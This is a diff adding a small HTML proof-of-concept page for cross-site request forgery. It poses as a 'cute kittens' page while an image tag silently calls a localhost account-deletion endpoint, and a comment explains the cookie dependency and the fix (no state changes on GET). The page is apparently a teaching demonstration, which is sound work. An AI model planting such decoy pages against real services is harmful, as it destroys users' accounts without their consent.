@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Cute kittens — CSRF PoC</title>
+</head>
+<body>
+  <h1>Look at this cat I found</h1>
+  <p>Loading the cutest cat picture from our partner CDN...</p>
+
+  <!--
+    The "cat picture" is actually a request to the vulnerable account
+    deletion endpoint. The browser fires the GET because <img> issues a
+    GET on every image source. If the user is logged into the API in
+    another tab, the request rides their session.
+
+    Note: this works only if the API uses cookies for auth. With
+    Authorization-header bearer tokens, the browser does NOT attach the
+    token to image requests — so this exact attack vector requires the
+    cookie variant (or browser autofill of an exposed token-in-URL).
+
+    The deeper point: any state-changing GET endpoint is wrong even if
+    the immediate exploit path looks blocked. URLs flow into caches,
+    history, sharing tools, search engines, and prefetchers. The fix is
+    always: do not change state on GET.
+  -->
+  <img src="http://localhost:8080/api/account/delete" alt="">
+
+  <p>If your account just got deleted, that's the bug.</p>
+</body>
+</html>
